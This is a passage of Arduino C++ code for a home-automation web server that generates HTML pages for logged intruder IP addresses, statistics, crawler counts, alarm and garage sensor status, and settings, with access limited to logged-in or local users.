  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1 width=100%>"));
  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F("<td><b>LAST TIME</b></td><td><b>IP ADDRESS</b></td><td><b>TYPE</b></td><td><b>COUNT</b></td>"));
  G_EthernetClient.println(F("</tr>"));

  //The hacker list is unordered but in the following algorithm
  //we extract and report a list in chronological order
  //IP Address
  unsigned long l_prev_datetime = Now();
  int l_next_record;
  int l_count = 0;
  while (true) {
    l_count++;
    l_next_record = GetNextIPAddressTableRecord(l_prev_datetime);
    if (l_next_record == -1)
      break; //We are finished
    //

    //Print the next record
    G_EthernetClient.print(F("<tr>"));
    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(DateToString(G_FailedHTMLRequestList[l_next_record].LastDateTime));
    G_EthernetClient.print(' ');
    G_EthernetClient.print(TimeToHHMM(G_FailedHTMLRequestList[l_next_record].LastDateTime));
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.print(F("<td>"));
    for (byte l_byte = 0; l_byte < DC_IPAddressFieldCount; l_byte++) {
      if ((l_byte == 3) && (G_FailedHTMLRequestList[l_next_record].IPAddress[l_byte] == 0))
        G_EthernetClient.print("*");
      else
        G_EthernetClient.print(G_FailedHTMLRequestList[l_next_record].IPAddress[l_byte]);
      //
      if (l_byte < 3)
        G_EthernetClient.print(".");
      //
    }
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(G_FailedHTMLRequestList[l_next_record].BanType);
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(G_FailedHTMLRequestList[l_next_record].AttemptCount);
    G_EthernetClient.print(F("</td>"));

    G_EthernetClient.print(F("</tr>"));

  } //loop to print the hacker records in chronological order

  if (!G_Mobile_Flag) {
    G_EthernetClient.print(F("<tr>"));
    G_EthernetClient.println(F("<td colspan=\"5\" style=\"vertical-align:top;\">")); //Mobile would be colspan=4
    G_EthernetClient.println(F("<table border=1>"));
    G_EthernetClient.print  (F("<tr style=\"font-family:Courier;font-size:20px;background-color:White;\">"));
    G_EthernetClient.println(F("<td align=\"left\">"));
    G_EthernetClient.print  (F("This table lists "));
    G_EthernetClient.print  (DC_FailedHTMLRequestListCount);
    G_EthernetClient.print  (F(" recent IP addresses<br>"));
    G_EthernetClient.print  (F("that sent invalid html requests to the<br>"));
    G_EthernetClient.print  (F("system.<br>"));
    G_EthernetClient.print  (F("<br>"));
    G_EthernetClient.print  (F("Table records are deleted according to<br>"));
    G_EthernetClient.print  (F("a time plus based ranking system."));
    G_EthernetClient.print(F("</td>"));
    G_EthernetClient.print(F("</tr>"));
    G_EthernetClient.println(F("</table>"));
    G_EthernetClient.print(F("</td>"));
    G_EthernetClient.print(F("</tr>"));
  }

  if ((UserLoggedIn()) ||
      (LocalIP(G_RemoteIPAddress))) {
    G_EthernetClient.println(F("<tr><td style='background-color:sandybrown;'><b>IP ADDRESS:</b></td>"));

    G_EthernetClient.print(F("<td colspan=\"3\"><input type='text' id='IPADDRESS' name='IPADDRESS' "));
    G_EthernetClient.print(F("style='font-family:Courier;font-size:20px;background-color:White;text-align:left;width:100%' value=''>"));
    G_EthernetClient.println(F("</td></tr>"));
  }

  G_EthernetClient.println(F(      "</table>"));
  G_EthernetClient.println(F(    "</td>"));

  G_EthernetClient.println(F(  "</tr>"));
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //HackerActivityWebPage

//----------------------------------------------------------------------------------------------

int GetNextIPAddressTableRecord(unsigned long &p_prev_datetime) {
  const byte c_proc_num = 115;
  Push(c_proc_num);
  //search for the next oldest record to print based on p_prev_datetime
  unsigned long l_next_datetime = 0;
  int l_next_record = -1;
  for (int l_index = 0; l_index < DC_FailedHTMLRequestListCount; l_index++) {
    if (G_FailedHTMLRequestList[l_index].LastDateTime != 0) {
      if (G_FailedHTMLRequestList[l_index].LastDateTime < p_prev_datetime) {
        if (l_next_datetime == 0) {//first record
          l_next_datetime = G_FailedHTMLRequestList[l_index].LastDateTime;
          l_next_record   = l_index;
        }
        else if (G_FailedHTMLRequestList[l_index].LastDateTime > l_next_datetime) {//younger record
          l_next_datetime = G_FailedHTMLRequestList[l_index].LastDateTime;
          l_next_record   = l_index;
        }
      } //skip records already processed
    } //skip null records
  } //iterate over the hacker list
  p_prev_datetime = l_next_datetime;
  CheckRAM();
  Pop(c_proc_num);
  return l_next_record;
}  //GetNextIPAddressTableRecord

//----------------------------------------------------------------------------------------------

#ifdef D_2WGApp
void BathroomWebPage() {
  const byte c_proc_num = 27;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_BATHROOM_75));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(300, EPSR(E_BATHROOM_75), St_Bathroom_WPE);

  if ((UserLoggedIn()) ||
      (LocalIP(G_RemoteIPAddress))) {
    G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F(            "<td><b>PAGE ACTIONS</b></td>"));
    G_EthernetClient.println(F(        "</tr>"));

    G_EthernetClient.print(F(          "<tr>"));
    G_EthernetClient.print(F(          "<td>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[13]);
    G_EthernetClient.println(F("/>Light Activate</a><br>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[14]);
    G_EthernetClient.println(F("/>Fan Activate</a><br>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[15]);
    G_EthernetClient.println(F("/>Heater Activate</a><br>"));
    G_EthernetClient.print(F(          "</td>"));
    G_EthernetClient.println(F(        "</tr>"));
  }

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1 width=100%>"));
  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F(            "<td><b>SENSOR</b></td><td><b>STATUS</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.print(F(            "<td>Light</td>"));
  G_EthernetClient.print(F(            "<td>ON</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.print(F(            "<td>Fan</td>"));
  G_EthernetClient.print(F(            "<td>ON</td>"));
  G_EthernetClient.println(F(        "</tr>"));
  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.print(F(            "<td>Heater</td>"));
  G_EthernetClient.print(F(            "<td>OFF</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr>"));
  G_EthernetClient.print(F(            "<td>Temperature</td>"));
  G_EthernetClient.print(F(            "<td>18.6C</td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.println(F("<td colspan=\"2\" style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1>"));
  G_EthernetClient.print  (F("<tr style=\"font-family:Courier;background-color:White;\">"));
  G_EthernetClient.println(F("<td align=\"left\">"));
  G_EthernetClient.print  (F("This web page is a<br>"));
  G_EthernetClient.print  (F("design concept.<br>"));
  G_EthernetClient.print  (F("None of the data<br>"));
  G_EthernetClient.print  (F("is active."));
  G_EthernetClient.print(F("</td>"));
  G_EthernetClient.print(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.print(F("</td>"));
  G_EthernetClient.print(F("</tr>"));

  G_EthernetClient.println(F(      "</table>"));
  G_EthernetClient.println(F(    "</td>"));

  G_EthernetClient.println(F(  "</tr>"));
  G_EthernetClient.print(F(  "</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //BathroomWebPage
#endif

//----------------------------------------------------------------------------------------------

void StatisticsWebPage() {
  const byte c_proc_num = 88;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_STATISTICS_285));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(950, EPSR(E_STATISTICS_285), St_Statistics_WPE);
  ShowStatisticsComment(1); //Bottom of LHS

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1 width=100%>"));
  G_EthernetClient.print(F(          "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F(            "<td><b>ACTIVITY</b></td><td><b>MONTH</b></td><td><b>DAY</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  SPIDeviceSelect(DC_SDCardSSPin);
  String l_filename = EPSR(E_STATSdtTXT_286);
  File l_stats_file;
  boolean l_stats_file_OK = true;
  if (!SD.exists(&l_filename[0]))
    l_stats_file_OK = false;
  else {
    l_stats_file = SD.open(&l_filename[0], FILE_READ);
    if (!l_stats_file)
      l_stats_file_OK = false;
    //
  }
  SPIDeviceSelect(DC_EthernetSSPin);

  int l_total1 = 0;
  int l_total2 = 0;
  for (byte l_index = 0; l_index < DC_StatisticsCount; l_index++) {
    G_EthernetClient.print(F("<tr><td>"));

    if (l_stats_file_OK == true)
      //The direct file read assumes records numbered from one - so we adjust here
      G_EthernetClient.print(DirectFileRecordRead(l_stats_file, 27, l_index + 1));
    else
      G_EthernetClient.print(l_index);
    //

    G_EthernetClient.print(F("</td><td>"));
    G_EthernetClient.print(FormatAmt(G_StatActvMth[l_index], 0));
    l_total1 += G_StatActvMth[l_index];
    G_EthernetClient.println(F("</td><td>"));
    G_EthernetClient.print(FormatAmt(G_StatActvDay[l_index], 0));
    l_total2 += G_StatActvDay[l_index];
    G_EthernetClient.println(F("</td></tr>"));
  } //for each statistics

  //DISPLAY MONTH AND DAY TOTALS
  G_EthernetClient.print(F("<tr><td><b>TOTALS</b>"));
  G_EthernetClient.print(F("</td><td><b>"));
  G_EthernetClient.print(FormatAmt(l_total1, 0));
  G_EthernetClient.println(F("</b></td><td><b>"));
  G_EthernetClient.print(FormatAmt(l_total2, 0));
  G_EthernetClient.println(F("</b></td></tr>"));

  //Close the direct file
  if (l_stats_file_OK == true) {
    SPIDeviceSelect(DC_SDCardSSPin);
    l_stats_file.close();
    SPIDeviceSelect(DC_EthernetSSPin);
  }

  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</td>"));

  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.println(F("</form>"));

  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //StatisticsWebPage

//----------------------------------------------------------------------------------------------

void WebCrawlerWebPage() {
  const byte c_proc_num = 106;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_CRAWLER_ACTIVITY_321));
  //InitialiseWebPage(EPSR(E_WEB_CRAWLERS_297));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(975, "CRAWLER ACTIVITY", St_Web_Crawler_WPE);
  //InsertActionMenu(975, EPSR(E_WEB_CRAWLERS_297), St_Web_Crawler_WPE);

  if ((G_SDCardOK) &&
      ((UserLoggedIn()) ||
       (LocalIP(G_RemoteIPAddress)))) {
    G_EthernetClient.println(F("<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F("<td><b>PAGE ACTIONS</b></td>"));
    G_EthernetClient.println(F("</tr>"));

    G_EthernetClient.println(F("<tr><td><br>"));
    InsertLogFileLinks(DC_Crawler_Request_Log);
    G_EthernetClient.print(F("</td></tr>"));
  }

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.print(F("</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F("<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1 width=100%>"));
  G_EthernetClient.print(F("<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F("<td><b>CRAWLER</b></td><td><b>MONTH</b></td><td><b>DAY</b></td>"));
  G_EthernetClient.println(F("</tr>"));

  int l_total1 = 0;
  int l_total2 = 0;
  for (byte l_index = 0; l_index < G_CrawlerCount; l_index++) {
    G_EthernetClient.print(F("<tr><td>"));

    G_EthernetClient.print(G_WebCrawlers[l_index]);

    G_EthernetClient.print(F("</td><td>"));
    G_EthernetClient.print(FormatAmt(G_StatCrwlMth[l_index], 0));
    l_total1 += G_StatCrwlMth[l_index];
    G_EthernetClient.print(F("</td><td>"));
    G_EthernetClient.print(FormatAmt(G_StatCrwlDay[l_index], 0));
    l_total2 += G_StatCrwlDay[l_index];
    G_EthernetClient.println(F("</td></tr>"));
  } //for each crawler statistic

  //DISPLAY MONTH AND DAY TOTALS
  G_EthernetClient.print(F("<tr><td><b>TOTALS</b>"));
  G_EthernetClient.print(F("</td><td><b>"));
  G_EthernetClient.print(FormatAmt(l_total1, 0));
  G_EthernetClient.print(F("</b></td><td><b>"));
  G_EthernetClient.print(FormatAmt(l_total2, 0));
  G_EthernetClient.println(F("</b></td></tr>"));

  ShowStatisticsComment(3); //Bottom of RHS

  //END OF RHS TABLE
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</td>"));

  //END OF MASTER TABLE SINGLE ROW
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.print(F("</table>"));
  //END OF FORM
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //WebCrawlerWebPage

//----------------------------------------------------------------------------------------------

void SecurityWebPage() {
  const byte c_proc_num = 28;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_SECURITY_76));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(400, EPSR(E_SECURITY_76), St_Security_WPE);

  G_EthernetClient.println(F("<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F("<td><b>PAGE ACTIONS</b></td>"));
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>"));

  //To get these three options the user must be on the local WIFI LAN or logged in with a current cookie
  if ((UserLoggedIn()) ||
      (LocalIP(G_RemoteIPAddress))) {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[18]);
    G_EthernetClient.print(F("/>Alarm Activate</a><br>"));
#ifdef D_2WGApp
    if (!G_PremisesAlarmActive) {
      G_EthernetClient.print(F("<a href=/"));
      G_EthernetClient.print(G_PageNames[7]);
      G_EthernetClient.println(F("/>Garage Activate</a><br>"));
      if (G_GarageDoorActive) {
        G_EthernetClient.print(F("<a href=/"));
        G_EthernetClient.print(G_PageNames[8]);
        G_EthernetClient.print(F("/>Garage Operate</a><br>"));
      }
    }
#endif
  }
  G_EthernetClient.print(F("<a href=/"));
  G_EthernetClient.print(G_PageNames[4]);
  G_EthernetClient.print(F("/>Page Refresh</a>"));
  G_EthernetClient.print(F("</td>"));
  G_EthernetClient.println(F("</tr>"));

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.print(F("</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F("<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1>"));
  G_EthernetClient.print(F("<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F("<td><b>DEVICE</b></td><td><b>STATUS</b></td>"));
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>Alarm Active</td>"));
  if ((!UserLoggedIn()) &&
      (!LocalIP(G_RemoteIPAddress))) {
    //If you are an external user not logged we will not show you if the alarm is active or not
    G_EthernetClient.print(F("<td>XXX</td>"));
    randomSeed(Now()); //Used for PIR fake random readings below
  }
  else if (G_PremisesAlarmActive)
    G_EthernetClient.print(F("<td>YES</td>"));
  else
    G_EthernetClient.print(F("<td>NO</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

  for (int l_pir_display = 0; l_pir_display < DC_PIRCount; l_pir_display++) {
    G_EthernetClient.print(F("<tr><td>"));
    G_EthernetClient.print(GetPIRName(l_pir_display));
    G_EthernetClient.print(F("</td><td>"));
    //If you are an external user not logged we show random PIR times
    if ((!UserLoggedIn()) &&
        (!LocalIP(G_RemoteIPAddress)))
      G_EthernetClient.print(TimeToHHMMSS(Now() - random(4166))); //Random in last hour
    else
      G_EthernetClient.print(TimeToHHMMSS(G_PIRSensorList[l_pir_display].LastDetectionTime));
    //
    G_EthernetClient.println(F("</td></tr>"));
  }

#ifdef D_2WGApp
  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>WGR Active</td><td>"));
  //If you are an external user not logged we will not show you if the WWW garage door opening function is active
  if ((!UserLoggedIn()) &&
      (!LocalIP(G_RemoteIPAddress)))
    G_EthernetClient.print(F("XXX"));
  else if (G_GarageDoorActive)
    G_EthernetClient.print(F("YES"));
  else
    G_EthernetClient.print(F("NO"));
  //
  G_EthernetClient.println(F("</td></tr>"));


  //Initialise background colour
  if ((digitalRead(DC_GarageOpenPin) == LOW) && (digitalRead(DC_GarageClosedPin) == LOW))
    G_EthernetClient.print(F("<tr style=\"background-color:Orange;\">")); //NO. NO - Door is midway
  else if ((digitalRead(DC_GarageOpenPin) == HIGH) && (digitalRead(DC_GarageClosedPin) == HIGH))
    G_EthernetClient.print(F("<tr style=\"background-color:Red;\">"));    //YES, YES - Both sensors are closed - a problem
  else
    G_EthernetClient.print(F("<tr>"));
  //
  G_EthernetClient.print(F("<td>Garage Open</td><td>"));
  //We do not mind if external users know if the garage door is open or not.
  //There is no reason for the door to ever be open if we are not at home.
  if (digitalRead(DC_GarageOpenPin) == HIGH)
    G_EthernetClient.print(F("YES"));
  else
    G_EthernetClient.print(F("NO"));
  //
  G_EthernetClient.println(F("</td></tr>"));

  //This code is a duplicate of the above code - consider a sub procedure
  if ((digitalRead(DC_GarageOpenPin) == LOW) && (digitalRead(DC_GarageClosedPin) == LOW))
    G_EthernetClient.print(F("<tr style=\"background-color:Orange;\">")); //NO. NO - Door is midway
  else if ((digitalRead(DC_GarageOpenPin) == HIGH) && (digitalRead(DC_GarageClosedPin) == HIGH))
    G_EthernetClient.print(F("<tr style=\"background-color:Red;\">"));    //YES, YES - Both sensors are closed - a problem
  else
    G_EthernetClient.print(F("<tr>"));
  //

  G_EthernetClient.print(F("<td>Garage Closed</td><td>"));
  if (digitalRead(DC_GarageClosedPin) == HIGH)
    G_EthernetClient.print(F("YES"));
  else
    G_EthernetClient.print(F("NO"));
  //
  G_EthernetClient.println(F("</td></tr>"));
#endif

  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</td>"));

  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //SecurityWebPage

//----------------------------------------------------------------------------------------------

void SettingsWebPage() {
  const byte c_proc_num = 29;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_SETTINGS_77));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(700, EPSR(E_SETTINGS_77), St_Settings_WPE);

  //ACTION MENU and BACKUP if local LAN or logged in
  if ((UserLoggedIn()) ||
      (LocalIP(G_RemoteIPAddress))) {
    G_EthernetClient.println(F("<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F("<td><b>PAGE ACTIONS</b></td>"));
    G_EthernetClient.println(F("</tr>"));

    G_EthernetClient.print(F("<tr>"));
    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[46]);
    G_EthernetClient.println(F("/>Memory Backup</a><br><br>"));
  }

  if (UserLoggedIn()) {
    G_EthernetClient.print(F("<tr>"));
    G_EthernetClient.print(F("<td>"));
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[33]);
    G_EthernetClient.println(F("/>Test Email</a><br><br>"));

    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[39]);
    G_EthernetClient.println(F("/>UDP NTP Time Update</a><br><br>"));

    G_EthernetClient.print(F("</td></tr>"));
  } //If logged in show period change options

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.print(F("</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F("<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1>"));
  G_EthernetClient.print(F("<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F("<td><b>SETTING</b></td><td><b>STATUS</b></td>"));
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Alarm Default"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[20]);
    G_EthernetClient.print(F("/>Alarm Default</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Alarm_Default_3) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Alarm Automation"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[27]);
    G_EthernetClient.print(F("/>Alarm Automation</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Alarm_Automation_7) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

#ifdef D_2WGApp
  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Garage Door Default"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[21]);
    G_EthernetClient.print(F("/>Garage Door Default</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Garage_Door_Default_9) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));
#endif

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Email Default"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[22]);
    G_EthernetClient.print(F("/>Email Default</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Email_Default_4) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Email Active"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[23]);
    G_EthernetClient.print(F("/>Email Active</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (G_Email_Active)
    G_EthernetClient.print(F("<td>YES</td>"));
  else
    G_EthernetClient.print(F("<td>NO</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Daylight Savings"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[25]);
    G_EthernetClient.print(F("/>Daylight Saving</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Daylight_Saving_5) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("SRAM Checking"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[28]);
    G_EthernetClient.print(F("/>SRAM Checking</a>"));
  }
  G_EthernetClient.print(F("</td>"));

  if (EPSR(E_RAM_Checking_8) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Periodic RAM Reporting"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[26]);
    G_EthernetClient.print(F("/>Periodic SRAM Reports</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Periodic_RAM_Reporting_6) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

#ifdef D_2WGApp
  //Heating Control
  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Automatic Heating"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[34]);
    G_EthernetClient.print(F("/>Automatic Heating</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Heating_Mode_10) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr><td>"));
  if (!UserLoggedIn())
    G_EthernetClient.print(F("Automatic Cooling"));
  else {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[35]);
    G_EthernetClient.print(F("/>Automatic Cooling</a>"));
  }
  G_EthernetClient.print(F("</td>"));
  if (EPSR(E_Cooling_Mode_11) == C_T)
    G_EthernetClient.print(F("<td>ON</td>"));
  else
    G_EthernetClient.print(F("<td>OFF</td>"));
  //
  G_EthernetClient.println(F("</tr>"));
#endif

  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.println(F("</td>"));  //first row

  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));

  CheckRAM();
  Pop(c_proc_num);
} //SettingsWebPage

//----------------------------------------------------------------------------------------------

void SDCardListWebPage(const String &p_start_folder) { //Minimise Stack size
  const byte c_proc_num = 30;
  Push(c_proc_num);

  CheckRAM();
  ProcessCache(false); //Check cache size before SD file operations

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_SD_CARD_78)); //will install some javascript
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(600, EPSR(E_SD_CARD_78), St_SD_Card_List_WPE);

  G_EthernetClient.println(F("<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F("<td><b>PAGE ACTIONS</b></td>"));
  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.print(F("<tr>"));
  G_EthernetClient.print(F("<td>"));

  InsertLogFileLinks(0); //Hack (public) or all five links

  if ((G_SDCardOK) &&
      (UserLoggedIn())) {
